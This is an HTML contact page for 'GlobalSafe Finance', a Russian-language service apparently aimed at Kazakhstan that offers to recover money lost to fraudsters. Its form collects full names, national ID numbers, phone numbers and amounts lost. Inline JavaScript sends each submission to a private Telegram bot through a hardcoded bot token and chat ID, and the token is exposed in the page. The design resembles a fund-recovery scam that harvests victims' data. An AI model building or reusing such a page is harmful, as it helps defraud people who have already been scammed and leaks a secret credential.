<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
  <title>Обращение — GlobalSafe Finance</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="../assets/css/global.css">
  <style>
body{background:var(--bg);padding-bottom:70px}
.fp{max-width:500px;margin:0 auto;padding:clamp(20px,4vw,32px) clamp(16px,4vw,16px) 60px}
.fc{background:rgba(10,10,15,.95);border:1px solid var(--border);border-radius:var(--radius2);padding:clamp(20px,4vw,28px) clamp(16px,4vw,20px) clamp(24px,5vw,36px);position:relative;overflow:hidden;box-shadow:0 20px 50px rgba(0,0,0,.3)}
.fc::before{content:'';position:absolute;top:-100px;right:-100px;width:250px;height:250px;background:radial-gradient(circle,rgba(99,102,241,.06),transparent);border-radius:50%;pointer-events:none}
.fc h1{font-size:1.15rem;font-weight:800;color:#fff;margin-bottom:4px;position:relative}
.fc .sub{color:var(--text3);font-size:.85rem;margin-bottom:24px;position:relative}
.ts{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:20px}
.to{padding:14px 10px;background:var(--surface);border:2px solid var(--border);border-radius:var(--radius);cursor:pointer;text-align:center;transition:all .3s;position:relative;-webkit-tap-highlight-color:transparent}
.to:active{transform:scale(.97)}
.to.sel{border-color:rgba(99,102,241,.4);background:rgba(99,102,241,.06);box-shadow:0 0 20px rgba(99,102,241,.1)}
.to input{position:absolute;opacity:0;pointer-events:none}
.to-i{font-size:1.5rem;margin-bottom:4px;display:block}
.to-n{font-weight:700;font-size:.75rem;color:#fff;display:block}
.to-d{font-size:.58rem;color:var(--text3);margin-top:2px;display:block}
.fr{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.sb{width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;border-radius:10px;font-size:.92rem;font-weight:700;cursor:pointer;font-family:var(--font);margin-top:8px;-webkit-tap-highlight-color:transparent;transition:all .25s;box-shadow:0 4px 20px rgba(99,102,241,.3)}
.sb:hover{box-shadow:0 6px 30px rgba(99,102,241,.4)}
.sb:active{transform:scale(.98)}
.sb:disabled{opacity:.4;cursor:not-allowed}
.fs{text-align:center;padding:24px 0}
.fs-i{font-size:2.5rem;margin-bottom:8px}
.fs h3{color:#fff;margin-bottom:4px;font-size:1rem}
.fs p{color:var(--text3);font-size:.85rem}
.fn{text-align:center;margin-top:12px;font-size:.62rem;color:var(--text4)}
.hl{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:18px;margin-top:14px;text-align:center}
.hl h3{font-size:.82rem;font-weight:700;color:#fff;margin-bottom:8px}
.hl-p{font-size:1.3rem;font-weight:800;color:var(--accent3);margin-bottom:2px;letter-spacing:2px}
.hl-d{font-size:.68rem;color:var(--text3)}
@media(max-width:380px){.ts{grid-template-columns:1fr}.fr{grid-template-columns:1fr}}
  </style>
</head>
<body>
  <div id="nav-container" data-page="contacts"></div>
  <div class="fp">
    <div class="fc">
      <h1>📋 Центр обращений</h1>
      <div class="sub">Выберите тип и заполните форму.</div>
      <form id="cf">
        <div class="ts">
          <label class="to sel" data-t="return"><input type="radio" name="type" value="Возврат средств" checked><span class="to-i">💰</span><span class="to-n">Возврат</span><span class="to-d">Деньги от мошенников</span></label>
          <label class="to" data-t="docs"><input type="radio" name="type" value="Документ"><span class="to-i">📄</span><span class="to-n">Документ</span><span class="to-d">Заявление, жалоба</span></label>
          <label class="to" data-t="feedback"><input type="radio" name="type" value="Обратная связь"><span class="to-i">💬</span><span class="to-n">Связь</span><span class="to-d">Вопрос, отзыв</span></label>
          <label class="to" data-t="org"><input type="radio" name="type" value="Организациям"><span class="to-i">🏛️</span><span class="to-n">Организациям</span><span class="to-d">АРРФР, полиция</span></label>
        </div>
        <div class="rf"><div class="fr"><div class="fg"><label>ФИО *</label><input type="text" name="name" placeholder="Иванов Иван" required></div><div class="fg"><label>ИИН *</label><input type="text" name="iin" placeholder="123456789012" maxlength="12" required></div></div><div class="fg"><label>Телефон *</label><input type="tel" name="phone" placeholder="+7 7XX XXX XX XX" required></div><div class="fg"><label>Доп. номера</label><input type="text" name="extraPhones"></div><div class="fr"><div class="fg"><label>Сумма (₸)</label><input type="text" name="amount"></div><div class="fg"><label>Когда звонить</label><input type="text" name="callTime"></div></div><div class="fg"><label>Платформа</label><input type="text" name="company"></div><div class="fg"><label>Детали</label><textarea name="comment"></textarea></div></div>
        <div class="df" style="display:none"><div class="fr"><div class="fg"><label>ФИО *</label><input type="text" name="docName" required></div><div class="fg"><label>Телефон *</label><input type="tel" name="docPhone" required></div></div><div class="fg"><label>Тип документа *</label><select name="docType" required><option value="">Выберите...</option><option>Заявление в полицию</option><option>Жалоба в АРРФР</option><option>Претензия в банк</option><option>Исковое заявление</option><option>Другое</option></select></div><div class="fg"><label>Описание</label><textarea name="docComment"></textarea></div></div>
        <div class="ff" style="display:none"><div class="fr"><div class="fg"><label>Имя *</label><input type="text" name="fbName" required></div><div class="fg"><label>Телефон</label><input type="tel" name="fbPhone"></div></div><div class="fg"><label>Тема *</label><select name="fbTopic" required><option value="">Выберите...</option><option>Вопрос</option><option>Предложение</option><option>Отзыв</option><option>Другое</option></select></div><div class="fg"><label>Сообщение *</label><textarea name="fbMessage" required></textarea></div></div>
        <div class="of" style="display:none"><div class="fr"><div class="fg"><label>ФИО *</label><input type="text" name="orgName" required></div><div class="fg"><label>Телефон *</label><input type="tel" name="orgPhone" required></div></div><div class="fg"><label>Организация *</label><select name="orgType" required><option value="">Выберите...</option><option>АРРФР</option><option>НБ РК</option><option>Полиция</option><option>Прокуратура</option><option>Банк</option><option>Другая</option></select></div><div class="fg"><label>Суть *</label><textarea name="orgComment" required></textarea></div></div>
        <button type="submit" class="sb">Отправить заявку</button>
      </form>
      <div id="fs" class="fs" style="display:none"><div class="fs-i">✅</div><h3>Отправлено!</h3><p>Свяжемся в ближайшее время.</p></div>
      <div class="fn">Данные защищены</div>
    </div>
    <div class="hl"><div class="hl-d">Горячие линии</div><div class="hl-p">1434 · 102 · 116</div></div>
  </div>
  <footer class="ftr"><p>© 2026 GlobalSafe Finance</p></footer>
  <script src="../assets/js/nav.js"></script>
  <script>
  document.querySelectorAll('.to').forEach(function(o){o.addEventListener('click',function(){document.querySelectorAll('.to').forEach(function(x){x.classList.remove('sel')});this.classList.add('sel');this.querySelector('input').checked=true;var t=this.dataset.t;document.querySelector('.rf').style.display=t==='return'?'block':'none';document.querySelector('.df').style.display=t==='docs'?'block':'none';document.querySelector('.ff').style.display=t==='feedback'?'block':'none';document.querySelector('.of').style.display=t==='org'?'block':'none'})});

  document.getElementById('cf').addEventListener('submit',function(e){
    e.preventDefault();var self=this;var btn=self.querySelector('.sb');btn.disabled=true;btn.textContent='Отправка...';
    var type=document.querySelector('input[name="type"]:checked').value;
    var text='📋 *Обращение*\n\n📌 Тип: '+type+'\n\n';
    var d=new FormData(self);
    if(type==='Возврат средств'){text+='👤 ФИО: '+(d.get('name')||'')+'\n🆔 ИИН: '+(d.get('iin')||'')+'\n📱 Телефон: '+(d.get('phone')||'');if(d.get('extraPhones'))text+='\n📞 Доп: '+d.get('extraPhones');if(d.get('amount'))text+='\n💰 Сумма: '+d.get('amount')+' ₸';if(d.get('company'))text+='\n🏢 Платформа: '+d.get('company');if(d.get('callTime'))text+='\n📅 Звонить: '+d.get('callTime');if(d.get('comment'))text+='\n💬 '+d.get('comment')}
    else if(type==='Документ'){text+='👤 ФИО: '+(d.get('docName')||'')+'\n📱 Телефон: '+(d.get('docPhone')||'')+'\n📄 Документ: '+(d.get('docType')||'');if(d.get('docComment'))text+='\n💬 '+d.get('docComment')}
    else if(type==='Обратная связь'){text+='👤 Имя: '+(d.get('fbName')||'')+'\n📋 Тема: '+(d.get('fbTopic')||'');if(d.get('fbPhone'))text+='\n📱 Телефон: '+d.get('fbPhone');if(d.get('fbMessage'))text+='\n💬 '+d.get('fbMessage')}
    else{text+='👤 ФИО: '+(d.get('orgName')||'')+'\n🏛️ Организация: '+(d.get('orgType')||'');if(d.get('orgPhone'))text+='\n📱 Телефон: '+d.get('orgPhone');if(d.get('orgComment'))text+='\n💬 '+d.get('orgComment')}
    fetch('https://api.telegram.org/bot8829750295:AAEdnt-7FPCVuVbgj6tgn7eC2_2LpY5VHCk/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'8471070560',text:text})}).then(function(r){return r.json()}).then(function(d){if(d.ok){self.style.display='none';document.getElementById('fs').style.display='block'}else{alert('Ошибка');btn.disabled=false;btn.textContent='Отправить заявку'}}).catch(function(){alert('Ошибка сети');btn.disabled=false;btn.textContent='Отправить заявку'});
  });
  </script>
</body>
</html>
